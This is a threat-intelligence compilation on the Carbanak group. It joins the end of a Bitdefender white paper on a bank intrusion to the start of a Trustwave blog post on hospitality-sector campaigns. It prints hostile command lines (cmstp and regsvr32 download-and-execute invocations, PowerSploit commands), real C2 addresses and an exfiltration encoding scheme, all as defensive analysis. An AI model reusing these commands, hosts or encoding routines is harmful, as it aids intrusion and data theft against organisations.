of internal banking systems by collecting and studying this type of information, in an attempt to make their attacks more efficient and stealthier. Their specialization in compromising banking infrastructures could be a direct consequence of intelligence collected and assimilated after each attack on previous financial institutions. This level of intimate knowledge of how banking applications work based on stolen documentation, helps them quickly achieve their purpose, which is to access and transfer financial assets. The more information they have on the inner workings of banking applications, the easier it becomes to pull off surgical cyber heists and avoid security tripwires. Day 30 Day 33 A series of archives were created containing manuals, guides and training materials for different applications. The information gathered was archived and organized in different folders. Attackers connected to servers and hosts with access to banking applications. The connections were initiated from workstations that had activity after regular office hours. Day 33 to 46 A series of archives were created containing manuals, guides and training materials for different applications. The information gathered was archived and organized in different folders. [6] White Paper Day 46 to 63 Using a compromised domain administrator account, attackers remotely dial into various network workstations and ultimately remove the archives used to store the baking materials, to cover their tracks Starting on Day 33, attackers connected to servers and hosts with access to banking applications. The connections were initiated from workstations that had activity after regular office hours. The workstations used to connect to these machines were logged in from and controlled by a workstation that was not part of the legitimate corporate infrastructure. The system belonged to the adversary and accessed the organization network through a VPN tunnel established by the Cobalt Strike beacon component, to contact the internal corporate network systems. These command & control connections last between 20 minutes and one hour on average, based on the logs available for forensic investigation. The documents prepared for exfiltration, which were relevant to the internal applications, as well as the connections to banking applications after regular office hours, point to a financially motivated attack. Below is a complete lateral movement timeline that includes all major events related to what infrastructure assets were compromised and when. Marked in red are the three major milestones achieved during the attack: the moment the domain controller was compromised, the moment documents started being stored on an internal endpoint, and when the threat actors first connected to a host with access to banking applications . This lateral movement timeline was compiled based on forensic evidence correlated from several analyzed systems and network events. It is the most relevant blueprint, revealing a complete attack timeline and behavior of the notorious financial cyber-criminal group when inside an infrastructure belonging to a financial organization. Lateral Movement Timeline Day 0 16:48:53 1st endpoint compromised after opening the spearphishing email ------ 16:49:03 2nd endpoint compromised after opening the spearphishing email ------ 18:20:00 3rd victim - Domain Controller compromise and admin credentials used throughout the duration of the attack ------ 18:40:49 Another endpoint compromised and Cobal Beacon dropped ------ 21:02:15 Another endpoint compromised and Cobal Beacon dropped Day 1 10:24:07 Another endpoint compromised and used to perform lateral movement ------ 13:27:45 Another endpoint compromised Day 4 10:19:00 Another endpoint compromised and Cobal Beacon dropped Day 7 16:00:00 Another endpoint compromised and Cobal Beacon dropped ------ 19:48:01 Another endpoint compromised Day 9 01:57:31 Another endpoint compromised ------ 16:43:00 Another endpoint compromised Day 10 1:30:17 Another endpoint compromised and used to store documents prepared for exfiltration. Day 15 21:39:11 Domain Controller accessed and used remotely dial into various endpoints Day 32 13:16:07 Another endpoint compromised Day 33 17:00:55 The moment when attackers connected to a host with access to banking applications. Day 34 8:52:18 Another host with access to banking applications was access by the attackers. [7] White Paper Day 35 15:15:33 Another host with access to banking applications was access by the attackers. ------ 21:40:58 Another endpoint compromised, starts to communicate with C&C Day 38 7:54:47 Another endpoint compromised Day 45 20:36:38 Another host with access to banking applications was access by the attackers. Day 47 20:55:38 Remote desktop into an internal system (compromised) Day 53 16:07:29 Another host with access to banking applications was access by the attackers. ------ 20:39:16 Another host with access to banking applications was access by the attackers. ------ 20:45:34 Another host with access to banking applications was access by the attackers. Day 55 12:56:28 Another host with access to banking applications was access by the attackers. Technical Analysis - experts only Below is a detailed analysis of the key indicators of compromise that helped build the APT timeline. It includes an event timeline compiled from two workstations used in the attack: the one used to compromise the domain controller and the one used to store all the network-collected data. The following events help paint a clear picture of actions immediately after the spear-phishing email attachment was opened, and show how the threat actors move laterally across the infrastructure and how they gathered relevant documentation. The “swift-fraud[.]com/documents/94563784.doc” URL was opened from the body of an email received in a spearphishing campaign targeting financial institutions. The Bitdefender research team obtained the document from our Threat Intelligence feeds and started analyzing it. According to other threat reports, the same URL has been used in delivering other tainted documents, potentially part of similar campaigns aimed at other financial institutions. This suggests the cybercriminal group may have been delivering multiple documents to victims, potentially laced with other exploits or droppers. The attack flow leaves behind a temporary file, which was found on two of the systems analyzed in the incident response. This temporary file was created on the filesystem after the opening of the original document file, downloaded from the malicious URL mentioned above. Analysis of the document on one of the systems reveals the steps involved in compromising the targeted system via the spear phishing email. The document contains four objects that are dropped on the filesystem of the victim: Attack flow after opening the tampered spearphishing document KbhpQIcahFCuZwq.sct - (bb784d55895db10b67b1b4f1f5b0be16) This object was not found on disk, it was deleted after running by “MGsCOxPSNK.txt”. Its role is to launch into execution the component “MGsCOxPSNK.txt” MGsCOxPSNK.txt (4bee6ff39103ffe31118260f9b1c4884) This file was not found on disk. Its functionality is to act as a next stage batch script which executes “cmstp. exe /s /ns tCrrDqBQoCcEkbnK.txt” cqHfjCkTtMwG.doc (c2a9443aac258a60d8cace43e839cf9f) This file can be found at the path: C:\Users\[redacted]\AppData\Local\Temp\cqHfjCkTtMwG.doc. It is a decoy file, because it acts as a normal document file while the malicious payload is being dropped and executed on the system. tCrrDqBQoCcEkbnK.txt (581c2a76b382deedb48d1df077e5bdf1) [8] This object can be found at the path: C:\Users\[redacted]\AppData\Local\Temp\tCrrDqBQoCcEkbnK.txt. It is a configuration file for cmstp.exe. It downloads a DLL dropper from “cloud[.]yourdocument[.]biz/robots.txt” White Paper The DLL Dropper downloaded on step four was not found on the file system and has the role of decrypting and dropping yet another JavaScript Dropper on the system. The decrypted JavaScript will be saved at the path “%APPDATA%\<registry_value>.txt” where registry_value = “HKEY_CURRENT_USER\Software\Microsoft\Notepad[USERNAME]\303F1428C3F”. Before exiting, the DLL will self-delete. The file “303F1428C3F.txt” (eb561d46c6283c632df88bd20ade6df4) can be found at the path C:\Users\[redacted]\ AppData\Roaming\303F1428C3F.txt. Also, the file was obfuscated and encrypted with RC4. After decryption, the binary tried to download a JavaScript backdoor from the Command and Control server (C&C) “nl[.][redacted][.]kz/robots.txt” and saved the file to “%APPDATA%\9D01CA.txt”. The backdoor “%APPDATA%\9D01CA.txt” was then executed via “regsrv32” (ex. “regsvr32 /S /N /U /I:path_backdoor scrobj”). The file “9D01CA.txt” sent an initial fingerprint of the system compromised which contained the name of the antivirus solution installed on the system, the local IP address, username, computername and OS version. After this communication, the component waited for instructions from the C&C “nl[.][redacted][.]kz/api/v1”. The traffic with the C&C was encrypted and the commands received from the C&C would split into five types: ● “d&exec”: download and execute payload (EXE of DLL) ● “more_eggs”: download additional scripts (including self-update) and save them in “%APPDATA%” ● “gtfo”: self delete/registry cleanup ● “more_onion”: runs additional downloaded scripts ● “via_x”: execute command shell commands All files mentioned in this stage of the attack were created on the system on Day 0 at around 16:49, when the first download link was accessed. It is worth mentioning that a binary executable named “rad353F7.tmp”, which appeared on the system at a later date, Day 6, was most certainly downloaded on the system by the Javascript Backdoor “9D01CA.txt”. Day 0 at 16:48:58 marks the touchdown of a decoy file on two systems. This file is a decoy because it acts as a normal document file while the malicious payload is being dropped on the system. On one of the two workstations, the decoy file has the creation time of Day 0 at 16:49:09 (10 seconds later than the other workstation) and the path C:\Users\[redacted]\AppData\Local\ Temp\cqHfjCkTtMwG.doc. This system shows more stages of the attack, because the adversary used this machine to perform lateral movement and compromise a domain administrator account within two hours of the initial compromise. After the compromise of the domain administrator account, a network discovery is performed and systems start to be logged on via remote desktop protocol to reach the objective of infiltrating the network and gathering information. Below is a complete timeline of events recorded on the workstation that was used to compromise the domain administrator account employed by attackers throughout the lateral movement process. Day 0 16:49:03 File create /Users/[redacted]/AppData/Local/Microsoft/Windows/INetCache/Content.Word/~WRF{39EC1EBF- 71AD-4216-BDC3-66B5DCB833F3}.tmp 16:49:09 File create \Users\[redacted]\AppData\Local\Temp\cqHfjCkTtMwG.doc 16:49:10 Faulting application name: EQNEDT32.EXE 16:49:30 File create C:\Users\[redacted]\AppData\Local\Temp\tCrrDqBQoCcEkbnK.txt 16:54:00 File create C:\Users\[redacted]\AppData\Roaming\303F1428C3F.txt 16:55:00 File create C:\Users\[redacted] \AppData\Roaming\9D01CA.txt 17:05:33 Powershell script communicated to 185.206.145.227 17:08:28 Find-LocalAdminAccess 17:08:54 Get-GPPPassword [9] White Paper 17:21:17 LastUsedTime systeminfo.exe 17:28:35 Run time for \Users\[redacted]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\smrs. exe (d68351f754a508a386c06946c8e79088) 17:46:28 Get-NetComputer 17:46:29 File create NetComputer.txt 17:48:10 Invoke-EnumerateLocalAdmin 17:48:26 Find-LocalAdminAccess 17:48:27 File create LocalAdminAccess.txt 17:56:12 Invoke-EnumerateLocalAdmin 17:57:03 File create EnumerateLocalAdmin.csv 18:15:53 PowerShell console is starting up 18:17:52 to 18:23:38 The legitimate jusched.exe is replaced with the jusched.exe (d68351f754a508a386c06946c8e79088) beacon downloader 18:44:39 File create \Users\Public\[redacted].txt 18:55:56 Run time for \Users\[redacted]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\smrs. exe (d68351f754a508a386c06946c8e79088) 18:55:56 LastUsedTime: C:\Windows\system32\cmd.exe 18:55:56 Run time for taskkill.exe 22:54:57 LastUsedTime: C:\Windows\system32\PING.EXE Day 1 10:19:15 Powershell run with content from pipe_8080 10:24:07 A service was installed in the system. 10:34:19 Run time for powershell.exe 13:00:48 Failed attempts to connect to five internal systems 13:26:53 Run time for net1.exe Day 2 17:48:59 Run time for nslookup.exe Day 5 12:07:49 Powershell script communicated to C2 server 13:28:37 Powershell script communicated to C2 server 13:38:45 Powershell script communicated to C2 server 15:49:08 File create C:\Users\[redacted]\AppData\Roaming\rad353F7.tmp [10] White Paper 17:08:40 Execution on file path: C:\Users\[redacted]\AppData\Roaming\rad353F7.tmp 17:08:41 Run time for C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Day 27 08:26:22 FileKeyLastWriteTimestamp mstsc.exe Day 46 11:33:47 Run time for jusched.exe Day 58 09:06:33 Day 59 08:34:07 Day 60 08:33:50 Day 63 08:13:37 Failed attempts to connect to several internal systems. 330 events: 322 target a single system ; 4 target a second system ; 4 target a third system . Failed attempts to connect to several internal systems. 358 events: 349 target a single system ; 5 target a second system; 5 target a third system. Failed attempts to connect to several internal systems. (355) target a single system ; 5 target a second system; 5 target a third system Failed attempts to connect to several internal systems. (304) target a single system ; 7 target a second system; 7 target a third system The full list of components and their corresponding hashes can be found in the IoC section below. The workstation used to store the .zip archives containing internal banking documents was compromised on Day 9 using domain admin credentials. On that day, attackers remotely dialed into the workstation and started accessing various network locations in an attempt to find various internal banking application files and documents. From Day 10 to Day 27, the same workstation was used to connect to other internal network server. On Day 28 at 10:43:57 and 19:53:49, two .zip archive containing internal documents were created. On Day 30 at 10:53:50, a third .zip archive was created, and it was deleted at 15:34:38. On Day 46, attackers deleted a series of documents and folders from the workstation, potentially to cover their tracks and leave no evidence regarding the collected documents. [11] White Paper Cobalt Strike Beacon Capabilities The Cobalt Strike beacon is a malicious agent implant that, once dropped on a compromised system, calls back to the attacker and checks for new commands to be executed on the compromised system. This versatile tool can support two types of communication mechanisms: asynchronous and interactive. The asynchronous mode keeps commands in a queue and, when the beacon connects to a C&C, it downloads commands, executes them, and finally reports results to the C&C server. This can be particularly useful when trying to keep a low network footprint and not trigger any alarms by constantly “chatting” back and forth with the C&C server. While the asynchronous communication mode is also known as “low and slow”, in the sense that it becomes inactive when an internet connection is not present, the interactive communication mode offers real-time interaction with the compromised workstation. Overall framework capabilities include, but are not limited to, executing shell commands, uploading and downloading files, recording keystrokes and taking screenshots, escalating privileges, deploying exploits, bypassing User Account Control (UAC), and even deploying memory scraping tools, such as Mimikatz, or enumerating Active Directory (AD) hosts. By supporting malleable communication with the C&C server, it can help attackers blend malicious traffic as legitimate, by allowing them to transform and store data, interpret it backwards, and extract and recover that data from a transaction. Cobalt Strike Framework capabilities • • • • • • • • • • • different commands can be executed (some leave traces in the events) session passing - to hijack sessions alternate parent processes upload and download files file System Commands (listfiles, make/remove directories etc.) Keystrokes and Screenshots (the tools for these actions are injected in different processes) SOCKS Proxy - set up a SOCKS proxy server to tunnel traffic through Beacon Reverse Pivoting Privilege Escalation Elevate with an Exploit Elevate with Known Credentials • Get SYSTEM - token impersonation for the SYSTEM user • UAC Bypass • Privileges - enable the privileges assigned to your current access token • Mimikatz - Beacon integrates Mimikatz (although in other cases it can use different tools such as Modified Windows Vault Password Dumper or Hook Password Change) • • Credential and Hash Harvesting - injects into LSASS and dumps the password hashes for local users on the current system Port Scanner • Network and Host Enumeration - interrogates and discovers targets in a Windows active directory network Kerberos Tickets - inject a Kerberos ticket in the current session, making the interaction with remote systems possible using the current tickets’ rights Lateral Movement - lateral movement can be performed when a domain admin or a domain user that has admin on the target • • [12] White Paper Conclusions The Carbanak group, which has a long track record of compromising infrastructure belonging to financial institutions, is still active. Its purpose remains to manipulate financial assets, such as transferring funds from bank accounts or taking over ATM infrastructures and instructing them to dispense cash at predetermined time intervals. Bitdefender’s investigation shows the attackers’ main methods remain to quietly infiltrate the infrastructure by establishing a foothold on an employee’s system, then move laterally across the infrastructure or elevate privileges to find critical systems that manage financial transactions or ATM networks. This attack falls in line with previous objectives observed in past attacks on other financial institutions, as the cybercriminal organization targeted the ATM network to reach systems belonging to key people within the organization who have access to ATM systems. If the attack had succeeded, it would have given hackers control over the ATM network, while money mules would have been standing by the ATM machines at pre-set time intervals to cash them out. They could have also been able to reset the cash-out limit on ATMs, using a predetermined / preauthorized card. This way, money mules could have extracted the same amount over and over, without the ATMs reporting any transactions to the bank. It is not uncommon in a targeted attack for phishing emails to bypass anti-spam solutions deployed at the mail server level, which is why it is good practice to deploy an in-depth security model that ensures URL filtering, behavior-based detection techniques and sandboxing, aside from classical anti-malware solutions. An enterprise-level solution that looks at both network traffic and endpoint behavior would observe lateral movements by the attacker and flag them for review by a security analyst. The damage observed throughout the investigation process was limited to access of internal documents on the compromised systems and user account credentials leaked. [13] White Paper Appendix A: IOCs File IOCs: Filename smrs.exe smrs.exe java.exe 94563784.doc md5 D68351f754a508a386c06946c8e79088 341917d17440ee8a334b202eb0378108 d90ecd6c825ce236838112898e1c4a2e d117c73e353193118a6383c30e42a95f WRF{8F0C5F8E-18A3-48CE-A2F4-2F4DB1B14E94}.tmp b8fc470b9665b33d2071034fdfd6629c KbhpQIcahFCuZwq.sct MGsCOxPSNK.txt cqHfjCkTtMwG.doc tCrrDqBQoCcEkbnK.txt DLL dropper DLL dropper DLL dropper DLL dropper 303F1428C3F.txt 9D01CA.txt rad353F7.tmp jusched.exe nusb1mon.exe netscan.exe netscan.exe psexec.exe psexesvc.exe psexec.exe psexesvc.exe Network IOCs: bb784d55895db10b67b1b4f1f5b0be16 4bee6ff39103ffe31118260f9b1c4884 c2a9443aac258a60d8cace43e839cf9f 581c2a76b382deedb48d1df077e5bdf1 f0645bd9367faf4e21a9c5e8c132bed7 34a58e62866e5c17db61ee5f95d52c58 38242fb29d7cb82a4ffd651189d9821e f0e52df398b938bf82d9e71ce754ab34 eb561d46c6283c632df88bd20ade6df4 bbaee5d936a3809f46fd409b8442f753 63c98b8c34ee9261c0068c7f0435a9f9 d68351f754a508a386c06946c8e79088 ddb9553c6e4e4908b5c7fbbdc4795d6c 1e94f1fdf5ace5e57d8b7832ea2da22e e7aa5608c81ba4fcd8d166501b90fc06 27304b246c7d5b4e149124d5f93c5b01 75b55bb34dac9d02740b9ad6b6820360 a7f7a0f74c8b48f1699858b3b6c11eda 87dfac39f577e5f52f0724455e8832a8 swift-fraud[.]com/documents/94563784.doc downloads initial doc cloud[.]yourdocument[.]biz/robots.txt downloads DLL dropper nl[.][redacted][.]kz/robots.txt nl[.][redacted][.]kz/api/v1 downloads JavaScript backdoor JavaScript backdoor C&C - gets commands and executes them 94.140.116.69 185.206.145.227 45.56.162.8 94.156.35.118 185.243.115.28 185.206.146.226 94.140.116.176 [14] White Paper Appendix B: smrs.exe (d68351f754a508a386c06946c8e79088) Downloader that downloads a shellcode, which in turn downloads the beacon. smrs.exe (341917d17440ee8a334b202eb0378108) Cobalt Strike beacon that’s being deployed on affected workloads. jusched.exe (d68351f754a508a386c06946c8e79088) Downloader that downloads a shellcode, which in turn downloads the beacon. Same file/hash as “smrs.exe”, just under a different name. nusb1mon.exe (ddb9553c6e4e4908b5c7fbbdc4795d6c) Tool that takes screenshots at specific time intervals. [15] White Paper Bitdefender is a global security technology company that delivers solutions in more than 100 countries through a network of value-added alliances, distributors and reseller partners. Since 2001, Bitdefender has consistently produced award-winning business and consumer security technology, and is a leading security provider in virtualization and cloud technologies. Through R&D, alliances and partnership teams, Bitdefender has elevated the highest standards of security excellence in both its number- one-ranked technology and its strategic alliances with the world’s leading virtualization and cloud technology providers. More information is available at http://www.bitdefender.com/. All Rights Reserved. © 2018 Bitdefender. All trademarks, trade names, and products referenced herein are property of their respective owners. FOR MORE INFORMATION VISIT: enterprise.bitdefender.com. N E _ n e - s 6 1 4 1 M 1 3 - 6 9 4 3 T A E R C - t n i r P e u B T P A l - r e p a P e t i h W - r e d n e f e d t i B Bitdefender is a global cybersecurity leader protecting over 500 million systems in more than 150 countries. Since 2001, Bitdefender innovation has consistently delivered award-winning security products and threat intelligence for the smart connected home, mobile users, modern businesses and their networks, devices, data centers and Cloud infrastructure. Today, Bitdefender is also the provider of choice, embedded in over 38% of the world’s security solutions. Recognized by industry, respected by vendors and evangelized by customers, Bitdefender is the cybersecurity company you can trust and rely on.All Rights Reserved. © 2019 Bitdefender. All trademarks, trade names, and products referenced herein are property of their respective owners."
carbanak,cti-hal,8ef00334df14,G0008,"Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 Trustwave Rapid Response: CrowdStrike Falcon Outage Update. Learn More Contact Us Login Incident Response Services Solutions SPIDERLABS BLOG Why Trustwave Request a Demo Partners Resources Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts April 28, 2017 | 10 minutes read | James Antonakos Introduction I recently engaged in an investigation involving two new Carbanak campaigns targeting the hospitality sector. In each campaign a malicious Word or RTF document was sent to specific employees, claiming the sender had trouble with the online ordering system, or was filing a lawsuit because a member of his group the got sick after dining at one of https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 1 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 This from restaurants. social organization's is augmented with a engineering scam personal phone call the attacker, encouraging the intended victim to open the email attachment and click inside it. The attacker then calls back 30 minutes later to check if the document was opened and hangs up as soon as the employee says yes. Phishing continues to be an effective attack vector, and a number of systems at the organization became infected as a result of opening the attachment. This time around, however, there are several twists added to the usual credit-card scraping and screen-shot grabbing malware previously seen in the November 2016 Carbanak campaign published blog in (https://www.trustwave.com/en- us/resources/blogs/spiderlabs-blog/new- carbanak-anunak-attack-methodology/). SpiderLabs Trustwave the SpiderLabs I want to provide my sincere thanks to Rodel Mendrez,Trustwave Senior Security Researcher, for all his assistance and knowledge. From malware reversing, to writing custom Python scripts, to historical knowledge to of exploits, his help was unraveling trickery employed by the Carbanak malware writers. to Brian Hussey,Trustwave Thanks also SpiderLabs, VP of Cyber Threat Detection and Response and Mike Wilkinson, Trustwave SpiderLabs IR, North America Managing Consultant, for their review and guidance. the many layers of invaluable Did You Open The Attachment? https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 2 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 The infected email attachment is a Microsoft Word docx or RTF file. These documents, and their MD5 hashes, have appeared across several campaigns: Name MD5 Hash File Size 2- reservation- 1.docx 77,238 bytes D5FBFD2D1D71405A755C73E1CAC5DF23 Claim_Dave.docxFBF653B89A0814F515DDBDCF82CC3795 119,256 bytes Letter 216 micro.docx FB442B402F73269BA5367142392B40C7 371,888 bytes 4404_inf04.docx3C12B6A6EBFFFDA75E4707067072C9CF 395,857 bytes Ord2.rtf 1,075,043 ABAB101E4E25A989D2943C30447DD216 bytes Let's take a look at what the most recent document, Ord2.rtf, puts into motion when opened. Note that all of the files listed here are contained within the malicious RTF document and extracted when it is opened: So that is two VBS and one PS1 file created by the infected RTF document. Persistence is established by creating a scheduled task that runs the main malware file every 25 minutes. Creates folder: %HOMEPATH%\Intel Creates: %HOMEPATH%\Intel\58d2a83f7778d 5.36783181.vbs --- Persistence script https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 3 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 %HOMEPATH%\Intel\58d2a83f77794 2.26535794.ps1 --- Malware downloader %HOMEPATH%\Intel\58d2a83f77790 8.23270411.vbs --- Command- and-Control (CnC) malware creator Scheduled task ""Intel"" that runs the persistence script every 25 minutes. Runs: The malware downloader if it has not run yet. The CnC malware creator script which creates additional malware and connects to 198.100.119.6 via port 80, 443, or 8080. Notes: The persistence script runs the malware downloader if it has not run yet. The malware downloader injects 400+ bytes of code into process memory. This code contains the domain name aaa.stage.14919005.www1.proslr 3.com and retrieves and executes shellcode stored in encoded DNS TXT records. But the malware is not finished yet. The CnC &nbsp;creates malware additional malware and support files in a creator script https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 4 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 different folder: Creates folder: %HOMEPATH%\Intel\{BFF4219E- C7D1-2880-AE58-9C9CD9701C90} Creates: %HOMEPATH%\Intel\ {BFF4...1C90}\58d2a83f777638.6 0220156.ini --- Command/Status file %HOMEPATH%\Intel\ {BFF4...1C90}\58d2a83f777688.7 8384945.ps1 --- Screenshot script %HOMEPATH%\Intel\ {BFF4...1C90}\58d2a83f7776b5.6 4953395.txt --- Base64 container file %HOMEPATH%\Intel\ {BFF4...1C90}\58d2a83f7776e0.7 2726761.vbs --- CnC script %HOMEPATH%\Intel\ {BFF4...1C90}\58d2a83f777716.4 8248237.vbs --- INI processing script %HOMEPATH%\Intel\ {BFF4...1C90}\58d2a83f777788.8 6541308.vbs --- script updater %HOMEPATH%\Intel\ {BFF4...1C90}\58d2a83f7777b0.3 9039198.vbs --- CnC persistence script Runs: CnC script if it has not run yet. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 5 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 The INI processing script. The CnC persistence script. Notes: The Command/Status file is used to receive commands from CnC and maintain malware status. The screenshot script saves a screen shot to ""screenshot.png"" when run. The Base64 container file contains one or more lines of base64 code used to update these files: Line 1: Command/Status file Line 2: screenshot script Line 3: CnC script Line 4: INI processing script The CnC script provides CnC communication and command / status. Connects to 198.100.119.6 via port 80, 443, or 8080 The INI processing script parses and processes INI file. Commands: ScreenShot, runvbs, runexe, runps1, update, delete. Delete command deletes all INI, PS1, VBS, TXT files, deletes Run key, and deletes scheduled task. The script updater reads base64 strings from the Base64 container file and uses them to: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 6 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 Create any .ini, ps1, or .vbs files that do not yet exist. Then runs the CnC script. Then runs the INI processing script. The CnC persistence script creates Foxconn.lnk which points to the script updater. Adds HKCU Run key CtMgk2y9v0_ for Foxconn.lnk. Creates scheduled task ""ZSUUvsCJNF"" that runs the script updater every 25 minutes. Then the CnC persistence script deletes itself. In addition to another PS1 file and four more VBS scripts, we also see INI and TXT files being created. What are these for? The answer is coming shortly. So much malware from one little RTF and a to start simple socially-engineered click everything in motion. This is why continuous security awareness training is essential. When you look at all the functionality built into those VBS and PS1 files you can see why Carbanak continues to be a significant threat. Even though some of the PS1 and VBS code is the same or very similar to that of previous attacks, there are some new twists in these files, and they are dramatic. Bring Back the INI Files https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 7 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 This new Carbanak campaign also resurrects the INI file, using it to issue commands to the compromised machine as well as to reflect the status of previous commands. INI files are text files used in earlier versions of Windows that contain details organized into sections, properties, and values. Here the is an investigation: configuration software ""in-use"" from file INI The ""last_cmd_id=2"" entry indicates that the malware has transmitted the victim's system information and a list of currently running processes back to the attacker, and is waiting for a new command to process. This is quite clear from the following code snippet: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 8 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 System info sent to the attacker contains the following items: OS Name, Version,&nbsp;&nbsp; Service Pack,&nbsp;&nbsp; OS Manufacturer,&nbsp;&nbsp; Windows Directory,&nbsp;&nbsp; Locale Available Physical Memory, Total Virtual Memory,&nbsp;&nbsp; Available Virtual Memory OS Name, System Name,&nbsp;&nbsp; System Manufacturer,&nbsp;&nbsp; System Model,&nbsp;&nbsp; Time Zone Total Physical Memory, Processor System Type,&nbsp;&nbsp; Processor,&nbsp;&nbsp; BIOS Version Microsoft Office Apps, Computer name,&nbsp;&nbsp; Domain,&nbsp;&nbsp; User name The INI processing script parses and processes the contents of the INI file, providing the following commands: Screenshot (save screenshot as screenshot.png) Runvbs https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 9 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 Runexe Runps Update Delete The Screenshot command takes a screenshot of the entire Desktop and saves it to the folder where the malware is installed. Here is a sample screenshot created by running the screenshot script: Depending on what a user has opened on their the screenshot could end up Desktop, providing valuable information. attacker with the ""update"" The is particularly command interesting, as it is used to update between one and four of the VBS / PS files created by the infected email attachment. The files are updated as illustrated in the following figure: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 10 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 After the files are updated, the new versions of the VBS files are executed to provide the new functionality. The INI processing script communicates with the attacker's CnC server after checking the victim's proxy settings via examination of this Registry key: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable The attacker's CnC IP address is hardcoded into the VBS file: hxxp://198.100.119.6:80/cd hxxp://198.100.119.6:443/cd hxxp://198.100.119.6:8080/cd This IP address is managed by GorillaServers, Inc. For the exfiltration method, the malware uses ""http POST"" to send data that has been retrieved/stolen from the infected system to the CnC server. Information is sent using randomized variable names and simple encryption on the text- based data using base64 encoding and substitution encryption with these alphabets: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 11 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 alfIn = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabc defghijklmnopqrstuvwxyz0123456 789"" alfOut = ""860vFjbqCRty2BUrpAGkEMLVKYJ97 1eNDThfilxugP5WHOSsnm3QIcdZwX4 oza"" For example, to exfiltrate the string ""Windows7"" the following occurs: Step [1]: Convert ""Windows7"" to base64: ""V2luZG93czc="" Step [2]: Add ""V2luZG93czc="" to exfiltration message: ""info%SEPR%V2luZG93czc="" Step [3]: Convert ""info%SEPR%V2luZG93czc="" to base64: ""aW5mbyVTRVBSJVYybHVaRzkzY3pjPQ=="" Step [4]: Encrypt """" using alfIn and alfOut: &nbsp;&nbsp;&nbsp; <a>&nbsp; Get symbol to convert. Example: ""a"" &nbsp;&nbsp;&nbsp; <b> Look up index value of symbol in alfIn. Example: alfIn[26] = ""a"" (see red input symbol above) &nbsp;&nbsp;&nbsp; <c> Substitute symbol from alfOut at same index. Example: alfOut[26] = ""J"" (see red symbol above) &nbsp;&nbsp;&nbsp; <d> For any input symbol not found in alfIn, just add symbol to output as is. Example: ""="" is unchanged. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 12 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 &nbsp;&nbsp;&nbsp; ""aW5mbyVTRVBSJVYybHVaRzkzY3pjPQ=="" encrypts to ""JLXx93MkAM6GRMK39qMJAQiQKZPfrp=="" Step [5]: URL encode ""JLXx93MkAM6GRMK39qMJAQiQKZPfrp=="" into &nbsp;""JLXx93MkAM6GRMK39qMJAQiQKZPfrp%3D%3D"" This information, along with other items, such as encoded and encrypted IDs based on the hard-drive serial number and the software version of the malware, are bundled into various ""parameter=value"" strings and sent to the CnC sever. The parameter names are randomly generated and match the regular expression [a-z]{1,2}[a- z0-9]{1,6} and there are also random data strings generated and transmitted (presumably to confuse anyone decoding them) that correspond to the regular expression [a-z0-9] {1,8}. Here is information from my own analysis system that is gathered by the malware and transmitted: CUID: sn = 907316415 Encoded sn = OTA3MzE2NDE1 id_b = 1-1-OTA3MzE2NDE1 CompInfo():outData = OS Name: Microsoft Windows 10 Pro|C:\WINDOWS|\Device\Harddis k1\Partition1 Version: 10.0.14393 https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/carbanak-continues-to-evolve-quietly-creeping-into-remote-hosts/ Pagina 13 di 33 Carbanak Continues To Evolve: Quietly Creeping into Remote Hosts 20/07/24, 12:18 Service Pack: 0.0 OS Manufacturer: Microsoft Corporation Windows Directory: C:\WINDOWS Locale: 0409 Available Physical Memory: 30120564 Total Virtual Memory: 38472844 Available Virtual Memory: 34617616 OS Name: 4980736 